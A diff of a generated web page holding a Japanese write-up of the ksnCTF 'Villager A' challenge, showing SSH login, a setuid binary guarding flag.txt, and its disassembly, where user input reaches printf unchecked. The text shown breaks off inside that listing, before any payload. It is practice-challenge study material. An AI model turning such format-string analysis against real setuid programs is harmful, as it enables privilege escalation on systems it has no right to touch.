@@ -1,127 +1,126 @@
 <!DOCTYPE html>
-<html lang="ja">
+<html lang="en-US">
   <head>
     <meta charset="utf-8">
     <meta name="viewport" content="width=device-width,initial-scale=1">
-    <title>ksnCTF Villager A | Note</title>
+    <title>ksnCTF Villager A</title>
     <meta name="description" content="ksnctf villagerA">
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.5.1/katex.min.css">
-  <link rel="stylesheet" href="https://cdn.jsdelivr.net/github-markdown-css/2.2.1/github-markdown.css">
     
-    <link rel="preload" href="/note/assets/css/0.styles.897873e1.css" as="style"><link rel="preload" href="/note/assets/js/app.72859486.js" as="script"><link rel="preload" href="/note/assets/js/52.f9c2959c.js" as="script"><link rel="prefetch" href="/note/assets/js/10.d9cd9364.js"><link rel="prefetch" href="/note/assets/js/11.09f89438.js"><link rel="prefetch" href="/note/assets/js/12.96e9e79b.js"><link rel="prefetch" href="/note/assets/js/13.fc237afd.js"><link rel="prefetch" href="/note/assets/js/14.bf9f8f50.js"><link rel="prefetch" href="/note/assets/js/15.8e031cf8.js"><link rel="prefetch" href="/note/assets/js/16.097335be.js"><link rel="prefetch" href="/note/assets/js/17.cbceba2f.js"><link rel="prefetch" href="/note/assets/js/18.056ea4f7.js"><link rel="prefetch" href="/note/assets/js/19.b9b9e6e8.js"><link rel="prefetch" href="/note/assets/js/2.0e9022b7.js"><link rel="prefetch" href="/note/assets/js/20.914effcc.js"><link rel="prefetch" href="/note/assets/js/21.3e4731e8.js"><link rel="prefetch" href="/note/assets/js/22.4d78f4fb.js"><link rel="prefetch" href="/note/assets/js/23.7764b69f.js"><link rel="prefetch" href="/note/assets/js/24.866c0e47.js"><link rel="prefetch" href="/note/assets/js/25.f493e26e.js"><link rel="prefetch" href="/note/assets/js/26.4617b4ff.js"><link rel="prefetch" href="/note/assets/js/27.9cc6fc9f.js"><link rel="prefetch" href="/note/assets/js/28.6192deb3.js"><link rel="prefetch" href="/note/assets/js/29.b8b4a07f.js"><link rel="prefetch" href="/note/assets/js/3.daca756c.js"><link rel="prefetch" href="/note/assets/js/30.dccc5930.js"><link rel="prefetch" href="/note/assets/js/31.9a15b1c7.js"><link rel="prefetch" href="/note/assets/js/32.86c269e5.js"><link rel="prefetch" href="/note/assets/js/33.395b69d4.js"><link rel="prefetch" href="/note/assets/js/34.7895ea86.js"><link rel="prefetch" href="/note/assets/js/35.b743153c.js"><link rel="prefetch" href="/note/assets/js/36.2f194d59.js"><link rel="prefetch" href="/note/assets/js/37.dbad2780.js"><link rel="prefetch" href="/note/assets/js/38.ec149c3b.js"><link rel="prefetch" href="/note/assets/js/39.d65a4f81.js"><link rel="prefetch" href="/note/assets/js/4.63a16ecc.js"><link rel="prefetch" href="/note/assets/js/40.1a1b8046.js"><link rel="prefetch" href="/note/assets/js/41.50a2115a.js"><link rel="prefetch" href="/note/assets/js/42.644f52b9.js"><link rel="prefetch" href="/note/assets/js/43.5711b110.js"><link rel="prefetch" href="/note/assets/js/44.e91701b4.js"><link rel="prefetch" href="/note/assets/js/45.984f2826.js"><link rel="prefetch" href="/note/assets/js/46.092310f9.js"><link rel="prefetch" href="/note/assets/js/47.0368b470.js"><link rel="prefetch" href="/note/assets/js/48.d6b8c257.js"><link rel="prefetch" href="/note/assets/js/49.73eb98bf.js"><link rel="prefetch" href="/note/assets/js/5.8162a690.js"><link rel="prefetch" href="/note/assets/js/50.d6861e39.js"><link rel="prefetch" href="/note/assets/js/51.dd8554a9.js"><link rel="prefetch" href="/note/assets/js/53.1162c8a4.js"><link rel="prefetch" href="/note/assets/js/54.45279e9d.js"><link rel="prefetch" href="/note/assets/js/55.c5f89314.js"><link rel="prefetch" href="/note/assets/js/56.a3b4d3cd.js"><link rel="prefetch" href="/note/assets/js/57.f0589548.js"><link rel="prefetch" href="/note/assets/js/6.a6de1a4a.js"><link rel="prefetch" href="/note/assets/js/7.d9575ca8.js"><link rel="prefetch" href="/note/assets/js/8.1343e4cf.js"><link rel="prefetch" href="/note/assets/js/9.9ef2f258.js">
-    <link rel="stylesheet" href="/note/assets/css/0.styles.897873e1.css">
+    
+    <link rel="preload" href="/assets/css/0.styles.927c50e1.css" as="style"><link rel="preload" href="/assets/js/app.e447834c.js" as="script"><link rel="preload" href="/assets/js/4.ea1d030e.js" as="script"><link rel="preload" href="/assets/js/51.b5080153.js" as="script"><link rel="prefetch" href="/assets/js/10.5fb78c6b.js"><link rel="prefetch" href="/assets/js/11.00a32e57.js"><link rel="prefetch" href="/assets/js/12.9753e7a4.js"><link rel="prefetch" href="/assets/js/13.4f4cba50.js"><link rel="prefetch" href="/assets/js/14.487fd3e0.js"><link rel="prefetch" href="/assets/js/15.fff641af.js"><link rel="prefetch" href="/assets/js/16.e24f8c23.js"><link rel="prefetch" href="/assets/js/17.e5931d87.js"><link rel="prefetch" href="/assets/js/18.c76a41c9.js"><link rel="prefetch" href="/assets/js/19.69fd1a13.js"><link rel="prefetch" href="/assets/js/2.e4b447ce.js"><link rel="prefetch" href="/assets/js/20.1d5aa23a.js"><link rel="prefetch" href="/assets/js/21.7456dddc.js"><link rel="prefetch" href="/assets/js/22.43561a19.js"><link rel="prefetch" href="/assets/js/23.f9ab2c6c.js"><link rel="prefetch" href="/assets/js/24.572a4c17.js"><link rel="prefetch" href="/assets/js/25.da0470d9.js"><link rel="prefetch" href="/assets/js/26.1498e92e.js"><link rel="prefetch" href="/assets/js/27.1b5e231b.js"><link rel="prefetch" href="/assets/js/28.7ff35c37.js"><link rel="prefetch" href="/assets/js/29.fc487f01.js"><link rel="prefetch" href="/assets/js/3.685664ec.js"><link rel="prefetch" href="/assets/js/30.3d0a5dee.js"><link rel="prefetch" href="/assets/js/31.6fb8f56c.js"><link rel="prefetch" href="/assets/js/32.eb72ad8c.js"><link rel="prefetch" href="/assets/js/33.02308810.js"><link rel="prefetch" href="/assets/js/34.6684b118.js"><link rel="prefetch" href="/assets/js/35.54494384.js"><link rel="prefetch" href="/assets/js/36.9c621ce9.js"><link rel="prefetch" href="/assets/js/37.540c8a48.js"><link rel="prefetch" href="/assets/js/38.03386e31.js"><link rel="prefetch" href="/assets/js/39.1242d758.js"><link rel="prefetch" href="/assets/js/40.480f85c3.js"><link rel="prefetch" href="/assets/js/41.4b5ba5a3.js"><link rel="prefetch" href="/assets/js/42.8cd7f453.js"><link rel="prefetch" href="/assets/js/43.71661e52.js"><link rel="prefetch" href="/assets/js/44.034fcd2c.js"><link rel="prefetch" href="/assets/js/45.d3084f6f.js"><link rel="prefetch" href="/assets/js/46.fdf5f3bf.js"><link rel="prefetch" href="/assets/js/47.83ae43c4.js"><link rel="prefetch" href="/assets/js/48.69175fae.js"><link rel="prefetch" href="/assets/js/49.b9434479.js"><link rel="prefetch" href="/assets/js/5.93dd8e5f.js"><link rel="prefetch" href="/assets/js/50.62e4ceac.js"><link rel="prefetch" href="/assets/js/52.868f2885.js"><link rel="prefetch" href="/assets/js/53.3313359d.js"><link rel="prefetch" href="/assets/js/54.eac3ac31.js"><link rel="prefetch" href="/assets/js/55.f8f80c24.js"><link rel="prefetch" href="/assets/js/56.915b9bdc.js"><link rel="prefetch" href="/assets/js/6.3684d401.js"><link rel="prefetch" href="/assets/js/7.462e790c.js"><link rel="prefetch" href="/assets/js/8.7999708e.js"><link rel="prefetch" href="/assets/js/9.ff1fb5db.js">
+    <link rel="stylesheet" href="/assets/css/0.styles.927c50e1.css">
   </head>
   <body>
-    <div id="app" data-server-rendered="true"><div class="theme-container"><header class="navbar"><div class="sidebar-button"><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" role="img" viewBox="0 0 448 512" class="icon"><path fill="currentColor" d="M436 124H12c-6.627 0-12-5.373-12-12V80c0-6.627 5.373-12 12-12h424c6.627 0 12 5.373 12 12v32c0 6.627-5.373 12-12 12zm0 160H12c-6.627 0-12-5.373-12-12v-32c0-6.627 5.373-12 12-12h424c6.627 0 12 5.373 12 12v32c0 6.627-5.373 12-12 12zm0 160H12c-6.627 0-12-5.373-12-12v-32c0-6.627 5.373-12 12-12h424c6.627 0 12 5.373 12 12v32c0 6.627-5.373 12-12 12z"></path></svg></div> <a href="/note/" class="home-link router-link-active"><!----> <span class="site-name">Note</span></a> <div class="links" style="max-width:nullpx;"><div class="search-box"><input aria-label="Search" autocomplete="off" spellcheck="false" value=""> <!----></div> <nav class="nav-links can-hide"><div class="nav-item"><a href="/note/about.html" class="nav-link">About</a></div><div class="nav-item"><a href="/note/list.html" class="nav-link">Articles</a></div><div class="nav-item"><a href="/note/chukapi_fun_art.html" class="nav-link">Chukapi-Fun-Art</a></div> <!----></nav></div></header> <div class="sidebar-mask"></div> <div class="sidebar"><nav class="nav-links"><div class="nav-item"><a href="/note/about.html" class="nav-link">About</a></div><div class="nav-item"><a href="/note/list.html" class="nav-link">Articles</a></div><div class="nav-item"><a href="/note/chukapi_fun_art.html" class="nav-link">Chukapi-Fun-Art</a></div> <!----></nav>  <ul class="sidebar-links"><li><div class="sidebar-group first"><p class="sidebar-heading open"><span>ksnCTF Villager A</span> <!----></p> <ul class="sidebar-group-items"><li><a href="/note/article/villager_a.html#攻撃のまとめ" class="sidebar-link">攻撃のまとめ</a><ul class="sidebar-sub-headers"></ul></li></ul></div></li></ul> </div> <div class="page"> <div class="content"><h1 id="ksnctf-villager-a"><a href="#ksnctf-villager-a" aria-hidden="true" class="header-anchor">#</a> ksnCTF Villager A</h1> <ul><li>sshで接続してみる</li></ul> <div class="language-bash= line-numbers-mode"><pre class="language-text"><code>$ ssh -p 10022 q4@ctfq.sweetduet.info
+    <div id="app" data-server-rendered="true"><div class="content__default"><h1 id="ksnctf-villager-a"><a href="#ksnctf-villager-a" aria-hidden="true" class="header-anchor">#</a> ksnCTF Villager A</h1> <ul><li>sshで接続してみる</li></ul> <div class="language-bash extra-class"><pre class="language-bash"><code>$ <span class="token function">ssh</span> -p <span class="token number">10022</span> q4@ctfq.sweetduet.info
 q4@ctfq.sweetduet.info's password: 
-Last login: Wed Mar 13 13:43:28 2019 from 10.0.2.2
-[q4@localhost ~]$ ls -l
-total 16
--r--------. 1 q4a  q4a    22  5月 22 02:12 2012 flag.txt
--rwsr-xr-x. 1 q4a  q4a  5857  5月 22 11:21 2012 q4
--rw-r--r--. 1 root root  151  6月  1 04:47 2012 readme.txt
-</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br></div></div><ul><li>flag.txtというファイルがあるので開きたい</li></ul> <div class="language-bash= line-numbers-mode"><pre class="language-text"><code>[q4@localhost ~]$ cat flag.txt 
+Last login: Wed Mar <span class="token number">13</span> <span class="token number">13</span>:43:28 <span class="token number">2019</span> from <span class="token number">10.0</span>.2.2
+<span class="token punctuation">[</span>q4@localhost ~<span class="token punctuation">]</span>$ <span class="token function">ls</span> -l
+total <span class="token number">16</span>
+-r--------. <span class="token number">1</span> q4a  q4a    <span class="token number">22</span>  <span class="token number">5</span>月 <span class="token number">22</span> 02:12 <span class="token number">2012</span> flag.txt
+-rwsr-xr-x. <span class="token number">1</span> q4a  q4a  <span class="token number">5857</span>  <span class="token number">5</span>月 <span class="token number">22</span> <span class="token number">11</span>:21 <span class="token number">2012</span> q4
+-rw-r--r--. <span class="token number">1</span> root root  <span class="token number">151</span>  <span class="token number">6</span>月  <span class="token number">1</span> 04:47 <span class="token number">2012</span> readme.txt
+</code></pre></div><ul><li>flag.txtというファイルがあるので開きたい</li></ul> <div class="language-bash extra-class"><pre class="language-bash"><code><span class="token punctuation">[</span>q4@localhost ~<span class="token punctuation">]</span>$ <span class="token function">cat</span> flag.txt 
 cat: flag.txt: Permission denied
-[q4@localhost ~]$ chmod 755 flag.txt 
+<span class="token punctuation">[</span>q4@localhost ~<span class="token punctuation">]</span>$ <span class="token function">chmod</span> <span class="token number">755</span> flag.txt 
 chmod: changing permissions of `flag.txt': Operation not permitted
-[q4@localhost ~]$ whoami
+<span class="token punctuation">[</span>q4@localhost ~<span class="token punctuation">]</span>$ <span class="token function">whoami</span>
 q4
-</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br></div></div><ul><li><code>permission denied</code>らしい</li> <li>当然<code>chmod</code>も使えない</li> <li>自分の名前は<code>q4</code>なので, <code>q4a</code>は使えない</li> <li>q4というファイルのパーミッションは<code>-rwsr-xr-x</code>なので, <code>q4a</code>と異なるグループに属しているユーザでも実行はできそう</li></ul> <div class="language-bash= line-numbers-mode"><pre class="language-text"><code>[q4@localhost ~]$ ./q4
+</code></pre></div><ul><li><code>permission denied</code>らしい</li> <li>当然<code>chmod</code>も使えない</li> <li>自分の名前は<code>q4</code>なので, <code>q4a</code>は使えない</li> <li>q4というファイルのパーミッションは<code>-rwsr-xr-x</code>なので, <code>q4a</code>と異なるグループに属しているユーザでも実行はできそう</li></ul> <div class="language-bash extra-class"><pre class="language-bash"><code><span class="token punctuation">[</span>q4@localhost ~<span class="token punctuation">]</span>$ ./q4
 What's your name?
 q4
 Hi, q4
 
 Do you want the flag?
-yes
+<span class="token function">yes</span>
 Do you want the flag?
-true
+<span class="token boolean">true</span>
 Do you want the flag?
-yes
+<span class="token function">yes</span>
 Do you want the flag?
 no
 I see. Good bye.
-</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br></div></div><ul><li>noを言うまで問うのをやめてくれない</li> <li><code>objdump</code>で確認する</li></ul> <div class="language-bash= line-numbers-mode"><pre class="language-text"><code>$ objdump -d -M intel ./q4
+</code></pre></div><ul><li>noを言うまで問うのをやめてくれない</li> <li><code>objdump</code>で確認する</li></ul> <div class="language-bash extra-class"><pre class="language-bash"><code>$ objdump -d -M intel ./q4
 ~~ 略 ~~~
-080485b4 &lt;main&gt;:
- 80485b4:       55                      push   ebp
- 80485b5:       89 e5                   mov    ebp,esp
- 80485b7:       83 e4 f0                and    esp,0xfffffff0
- 80485ba:       81 ec 20 04 00 00       sub    esp,0x420
- 80485c0:       c7 04 24 a4 87 04 08    mov    DWORD PTR [esp],0x80487a4
- 80485c7:       e8 f8 fe ff ff          call   80484c4 &lt;puts@plt&gt;
+080485b4 <span class="token operator">&lt;</span>main<span class="token operator">&gt;</span>:
+ 80485b4:       <span class="token number">55</span>                      push   ebp
+ 80485b5:       <span class="token number">89</span> e5                   mov    ebp,esp
+ 80485b7:       <span class="token number">83</span> e4 f0                and    esp,0xfffffff0
+ 80485ba:       <span class="token number">81</span> ec <span class="token number">20</span> 04 00 00       sub    esp,0x420
+ 80485c0:       c7 04 <span class="token number">24</span> a4 <span class="token number">87</span> 04 08    mov    DWORD PTR <span class="token punctuation">[</span>esp<span class="token punctuation">]</span>,0x80487a4
+ 80485c7:       e8 f8 fe ff ff          call   80484c4 <span class="token operator">&lt;</span>puts@plt<span class="token operator">&gt;</span>
  80485cc:       a1 04 9a 04 08          mov    eax,ds:0x8049a04
- 80485d1:       89 44 24 08             mov    DWORD PTR [esp+0x8],eax
- 80485d5:       c7 44 24 04 00 04 00    mov    DWORD PTR [esp+0x4],0x400
+ 80485d1:       <span class="token number">89</span> <span class="token number">44</span> <span class="token number">24</span> 08             mov    DWORD PTR <span class="token punctuation">[</span>esp+0x8<span class="token punctuation">]</span>,eax
+ 80485d5:       c7 <span class="token number">44</span> <span class="token number">24</span> 04 00 04 00    mov    DWORD PTR <span class="token punctuation">[</span>esp+0x4<span class="token punctuation">]</span>,0x400
  80485dc:       00 
- 80485dd:       8d 44 24 18             lea    eax,[esp+0x18]
- 80485e1:       89 04 24                mov    DWORD PTR [esp],eax
- 80485e4:       e8 9b fe ff ff          call   8048484 &lt;fgets@plt&gt;
- 80485e9:       c7 04 24 b6 87 04 08    mov    DWORD PTR [esp],0x80487b6
- 80485f0:       e8 bf fe ff ff          call   80484b4 &lt;printf@plt&gt;
- 80485f5:       8d 44 24 18             lea    eax,[esp+0x18]
- 80485f9:       89 04 24                mov    DWORD PTR [esp],eax
- 80485fc:       e8 b3 fe ff ff          call   80484b4 &lt;printf@plt&gt;
- 8048601:       c7 04 24 0a 00 00 00    mov    DWORD PTR [esp],0xa
- 8048608:       e8 67 fe ff ff          call   8048474 &lt;putchar@plt&gt;
- 804860d:       c7 84 24 18 04 00 00    mov    DWORD PTR [esp+0x418],0x1
- 8048614:       01 00 00 00 
- 8048618:       eb 67                   jmp    8048681 &lt;main+0xcd&gt;
- 804861a:       c7 04 24 bb 87 04 08    mov    DWORD PTR [esp],0x80487bb
- 8048621:       e8 9e fe ff ff          call   80484c4 &lt;puts@plt&gt;
- 8048626:       a1 04 9a 04 08          mov    eax,ds:0x8049a04
- 804862b:       89 44 24 08             mov    DWORD PTR [esp+0x8],eax
- 804862f:       c7 44 24 04 00 04 00    mov    DWORD PTR [esp+0x4],0x400
- 8048636:       00 
- 8048637:       8d 44 24 18             lea    eax,[esp+0x18]
- 804863b:       89 04 24                mov    DWORD PTR [esp],eax
- 804863e:       e8 41 fe ff ff          call   8048484 &lt;fgets@plt&gt;
- 8048643:       85 c0                   test   eax,eax
- 8048645:       0f 94 c0                sete   al
- 8048648:       84 c0                   test   al,al
- 804864a:       74 0a                   je     8048656 &lt;main+0xa2&gt;
+ 80485dd:       8d <span class="token number">44</span> <span class="token number">24</span> <span class="token number">18</span>             lea    eax,<span class="token punctuation">[</span>esp+0x18<span class="token punctuation">]</span>
+ 80485e1:       <span class="token number">89</span> 04 <span class="token number">24</span>                mov    DWORD PTR <span class="token punctuation">[</span>esp<span class="token punctuation">]</span>,eax
+ 80485e4:       e8 9b fe ff ff          call   <span class="token number">8048484</span> <span class="token operator">&lt;</span>fgets@plt<span class="token operator">&gt;</span>
+ 80485e9:       c7 04 <span class="token number">24</span> b6 <span class="token number">87</span> 04 08    mov    DWORD PTR <span class="token punctuation">[</span>esp<span class="token punctuation">]</span>,0x80487b6
+ 80485f0:       e8 bf fe ff ff          call   80484b4 <span class="token operator">&lt;</span>printf@plt<span class="token operator">&gt;</span>
+ 80485f5:       8d <span class="token number">44</span> <span class="token number">24</span> <span class="token number">18</span>             lea    eax,<span class="token punctuation">[</span>esp+0x18<span class="token punctuation">]</span>
+ 80485f9:       <span class="token number">89</span> 04 <span class="token number">24</span>                mov    DWORD PTR <span class="token punctuation">[</span>esp<span class="token punctuation">]</span>,eax
+ 80485fc:       e8 b3 fe ff ff          call   80484b4 <span class="token operator">&lt;</span>printf@plt<span class="token operator">&gt;</span>
+ <span class="token number">8048601</span>:       c7 04 <span class="token number">24</span> 0a 00 00 00    mov    DWORD PTR <span class="token punctuation">[</span>esp<span class="token punctuation">]</span>,0xa
+ <span class="token number">8048608</span>:       e8 <span class="token number">67</span> fe ff ff          call   <span class="token number">8048474</span> <span class="token operator">&lt;</span>putchar@plt<span class="token operator">&gt;</span>
+ 804860d:       c7 <span class="token number">84</span> <span class="token number">24</span> <span class="token number">18</span> 04 00 00    mov    DWORD PTR <span class="token punctuation">[</span>esp+0x418<span class="token punctuation">]</span>,0x1
+ <span class="token number">8048614</span>:       01 00 00 00 
+ <span class="token number">8048618</span>:       eb <span class="token number">67</span>                   jmp    <span class="token number">8048681</span> <span class="token operator">&lt;</span>main+0xcd<span class="token operator">&gt;</span>
+ 804861a:       c7 04 <span class="token number">24</span> bb <span class="token number">87</span> 04 08    mov    DWORD PTR <span class="token punctuation">[</span>esp<span class="token punctuation">]</span>,0x80487bb
+ <span class="token number">8048621</span>:       e8 9e fe ff ff          call   80484c4 <span class="token operator">&lt;</span>puts@plt<span class="token operator">&gt;</span>
+ <span class="token number">8048626</span>:       a1 04 9a 04 08          mov    eax,ds:0x8049a04
+ 804862b:       <span class="token number">89</span> <span class="token number">44</span> <span class="token number">24</span> 08             mov    DWORD PTR <span class="token punctuation">[</span>esp+0x8<span class="token punctuation">]</span>,eax
+ 804862f:       c7 <span class="token number">44</span> <span class="token number">24</span> 04 00 04 00    mov    DWORD PTR <span class="token punctuation">[</span>esp+0x4<span class="token punctuation">]</span>,0x400
+ <span class="token number">8048636</span>:       00 
+ <span class="token number">8048637</span>:       8d <span class="token number">44</span> <span class="token number">24</span> <span class="token number">18</span>             lea    eax,<span class="token punctuation">[</span>esp+0x18<span class="token punctuation">]</span>
+ 804863b:       <span class="token number">89</span> 04 <span class="token number">24</span>                mov    DWORD PTR <span class="token punctuation">[</span>esp<span class="token punctuation">]</span>,eax
+ 804863e:       e8 <span class="token number">41</span> fe ff ff          call   <span class="token number">8048484</span> <span class="token operator">&lt;</span>fgets@plt<span class="token operator">&gt;</span>
+ <span class="token number">8048643</span>:       <span class="token number">85</span> c0                   <span class="token builtin class-name">test</span>   eax,eax
+ <span class="token number">8048645</span>:       0f <span class="token number">94</span> c0                sete   al
+ <span class="token number">8048648</span>:       <span class="token number">84</span> c0                   <span class="token builtin class-name">test</span>   al,al
+ 804864a:       <span class="token number">74</span> 0a                   je     <span class="token number">8048656</span> <span class="token operator">&lt;</span>main+0xa<span class="token operator"><span class="token file-descriptor important">2</span>&gt;</span>
  804864c:       b8 00 00 00 00          mov    eax,0x0
- 8048651:       e9 86 00 00 00          jmp    80486dc &lt;main+0x128&gt;
- 8048656:       c7 44 24 04 d1 87 04    mov    DWORD PTR [esp+0x4],0x80487d1
+ <span class="token number">8048651</span>:       e9 <span class="token number">86</span> 00 00 00          jmp    80486dc <span class="token operator">&lt;</span>main+0x12<span class="token operator"><span class="token file-descriptor important">8</span>&gt;</span>
+ <span class="token number">8048656</span>:       c7 <span class="token number">44</span> <span class="token number">24</span> 04 d1 <span class="token number">87</span> 04    mov    DWORD PTR <span class="token punctuation">[</span>esp+0x4<span class="token punctuation">]</span>,0x80487d1
  804865d:       08 
- 804865e:       8d 44 24 18             lea    eax,[esp+0x18]
- 8048662:       89 04 24                mov    DWORD PTR [esp],eax
- 8048665:       e8 7a fe ff ff          call   80484e4 &lt;strcmp@plt&gt;
- 804866a:       85 c0                   test   eax,eax
- 804866c:       75 13                   jne    8048681 &lt;main+0xcd&gt;
- 804866e:       c7 04 24 d5 87 04 08    mov    DWORD PTR [esp],0x80487d5
- 8048675:       e8 4a fe ff ff          call   80484c4 &lt;puts@plt&gt;
+ 804865e:       8d <span class="token number">44</span> <span class="token number">24</span> <span class="token number">18</span>             lea    eax,<span class="token punctuation">[</span>esp+0x18<span class="token punctuation">]</span>
+ <span class="token number">8048662</span>:       <span class="token number">89</span> 04 <span class="token number">24</span>                mov    DWORD PTR <span class="token punctuation">[</span>esp<span class="token punctuation">]</span>,eax
+ <span class="token number">8048665</span>:       e8 7a fe ff ff          call   80484e4 <span class="token operator">&lt;</span>strcmp@plt<span class="token operator">&gt;</span>
+ 804866a:       <span class="token number">85</span> c0                   <span class="token builtin class-name">test</span>   eax,eax
+ 804866c:       <span class="token number">75</span> <span class="token number">13</span>                   jne    <span class="token number">8048681</span> <span class="token operator">&lt;</span>main+0xcd<span class="token operator">&gt;</span>
+ 804866e:       c7 04 <span class="token number">24</span> d5 <span class="token number">87</span> 04 08    mov    DWORD PTR <span class="token punctuation">[</span>esp<span class="token punctuation">]</span>,0x80487d5
+ <span class="token number">8048675</span>:       e8 4a fe ff ff          call   80484c4 <span class="token operator">&lt;</span>puts@plt<span class="token operator">&gt;</span>
  804867a:       b8 00 00 00 00          mov    eax,0x0
- 804867f:       eb 5b                   jmp    80486dc &lt;main+0x128&gt;
- 8048681:       8b 84 24 18 04 00 00    mov    eax,DWORD PTR [esp+0x418]
- 8048688:       85 c0                   test   eax,eax
- 804868a:       0f 95 c0                setne  al
- 804868d:       84 c0                   test   al,al
- 804868f:       75 89                   jne    804861a &lt;main+0x66&gt;
- 8048691:       c7 44 24 04 e6 87 04    mov    DWORD PTR [esp+0x4],0x80487e6
- 8048698:       08 
- 8048699:       c7 04 24 e8 87 04 08    mov    DWORD PTR [esp],0x80487e8
- 80486a0:       e8 ff fd ff ff          call   80484a4 &lt;fopen@plt&gt;
- 80486a5:       89 84 24 1c 04 00 00    mov    DWORD PTR [esp+0x41c],eax
- 80486ac:       8b 84 24 1c 04 00 00    mov    eax,DWORD PTR [esp+0x41c]
- 80486b3:       89 44 24 08             mov    DWORD PTR [esp+0x8],eax
- 80486b7:       c7 44 24 04 00 04 00    mov    DWORD PTR [esp+0x4],0x400
+ 804867f:       eb 5b                   jmp    80486dc <span class="token operator">&lt;</span>main+0x12<span class="token operator"><span class="token file-descriptor important">8</span>&gt;</span>
+ <span class="token number">8048681</span>:       8b <span class="token number">84</span> <span class="token number">24</span> <span class="token number">18</span> 04 00 00    mov    eax,DWORD PTR <span class="token punctuation">[</span>esp+0x418<span class="token punctuation">]</span>
+ <span class="token number">8048688</span>:       <span class="token number">85</span> c0                   <span class="token builtin class-name">test</span>   eax,eax
+ 804868a:       0f <span class="token number">95</span> c0                setne  al
+ 804868d:       <span class="token number">84</span> c0                   <span class="token builtin class-name">test</span>   al,al
+ 804868f:       <span class="token number">75</span> <span class="token number">89</span>                   jne    804861a <span class="token operator">&lt;</span>main+0x6<span class="token operator"><span class="token file-descriptor important">6</span>&gt;</span>
+ <span class="token number">8048691</span>:       c7 <span class="token number">44</span> <span class="token number">24</span> 04 e6 <span class="token number">87</span> 04    mov    DWORD PTR <span class="token punctuation">[</span>esp+0x4<span class="token punctuation">]</span>,0x80487e6
+ <span class="token number">8048698</span>:       08 
+ <span class="token number">8048699</span>:       c7 04 <span class="token number">24</span> e8 <span class="token number">87</span> 04 08    mov    DWORD PTR <span class="token punctuation">[</span>esp<span class="token punctuation">]</span>,0x80487e8
+ 80486a0:       e8 ff fd ff ff          call   80484a4 <span class="token operator">&lt;</span>fopen@plt<span class="token operator">&gt;</span>
+ 80486a5:       <span class="token number">89</span> <span class="token number">84</span> <span class="token number">24</span> 1c 04 00 00    mov    DWORD PTR <span class="token punctuation">[</span>esp+0x41c<span class="token punctuation">]</span>,eax
+ 80486ac:       8b <span class="token number">84</span> <span class="token number">24</span> 1c 04 00 00    mov    eax,DWORD PTR <span class="token punctuation">[</span>esp+0x41c<span class="token punctuation">]</span>
+ 80486b3:       <span class="token number">89</span> <span class="token number">44</span> <span class="token number">24</span> 08             mov    DWORD PTR <span class="token punctuation">[</span>esp+0x8<span class="token punctuation">]</span>,eax
+ 80486b7:       c7 <span class="token number">44</span> <span class="token number">24</span> 04 00 04 00    mov    DWORD PTR <span class="token punctuation">[</span>esp+0x4<span class="token punctuation">]</span>,0x400
  80486be:       00 
- 80486bf:       8d 44 24 18             lea    eax,[esp+0x18]
- 80486c3:       89 04 24                mov    DWORD PTR [esp],eax
- 80486c6:       e8 b9 fd ff ff          call   8048484 &lt;fgets@plt&gt;
- 80486cb:       8d 44 24 18             lea    eax,[esp+0x18]
- 80486cf:       89 04 24                mov    DWORD PTR [esp],eax
- 80486d2:       e8 dd fd ff ff          call   80484b4 &lt;printf@plt&gt;
+ 80486bf:       8d <span class="token number">44</span> <span class="token number">24</span> <span class="token number">18</span>             lea    eax,<span class="token punctuation">[</span>esp+0x18<span class="token punctuation">]</span>
+ 80486c3:       <span class="token number">89</span> 04 <span class="token number">24</span>                mov    DWORD PTR <span class="token punctuation">[</span>esp<span class="token punctuation">]</span>,eax
+ 80486c6:       e8 b9 fd ff ff          call   <span class="token number">8048484</span> <span class="token operator">&lt;</span>fgets@plt<span class="token operator">&gt;</span>
+ 80486cb:       8d <span class="token number">44</span> <span class="token number">24</span> <span class="token number">18</span>             lea    eax,<span class="token punctuation">[</span>esp+0x18<span class="token punctuation">]</span>
+ 80486cf:       <span class="token number">89</span> 04 <span class="token number">24</span>                mov    DWORD PTR <span class="token punctuation">[</span>esp<span class="token punctuation">]</span>,eax
+ 80486d2:       e8 <span class="token function">dd</span> fd ff ff          call   80484b4 <span class="token operator">&lt;</span>printf@plt<span class="token operator">&gt;</span>
  80486d7:       b8 00 00 00 00          mov    eax,0x0
  80486dc:       c9                      leave  
  80486dd:       c3                      ret    
- 80486de:       90                      nop
- 80486df:       90                      nop
+ 80486de:       <span class="token number">90</span>                      nop
+ 80486df:       <span class="token number">90</span>                      nop
 ~~ 略 ~~~
 
-</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br><span class="line-number">29</span><br><span class="line-number">30</span><br><span class="line-number">31</span><br><span class="line-number">32</span><br><span class="line-number">33</span><br><span class="line-number">34</span><br><span class="line-number">35</span><br><span class="line-number">36</span><br><span class="line-number">37</span><br><span class="line-number">38</span><br><span class="line-number">39</span><br><span class="line-number">40</span><br><span class="line-number">41</span><br><span class="line-number">42</span><br><span 